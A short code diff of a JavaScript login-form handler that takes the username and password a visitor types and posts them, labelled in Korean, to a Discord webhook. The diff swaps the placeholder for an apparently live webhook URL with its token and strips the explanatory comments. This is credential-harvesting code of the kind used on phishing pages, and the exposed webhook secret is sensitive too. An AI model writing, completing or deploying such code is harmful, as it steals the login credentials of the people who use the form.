@@ -1,10 +1,10 @@
 document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault(); // 기본 제출 동작 방지
+    event.preventDefault();
 
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // 여기에 Discord 웹훅 URL을 입력하세요.
+    const webhookURL = 'https://discord.com/api/webhooks/1310193187427586058/fshmsmwoK622L7ha0-rDkvG601rT5bC3P6i-TcMpPVIQN3GmbJS-OJ_wN3STVsY9iPXU';
 
     const data = {
         content: `아이디: ${username}, 비밀번호: ${password}`
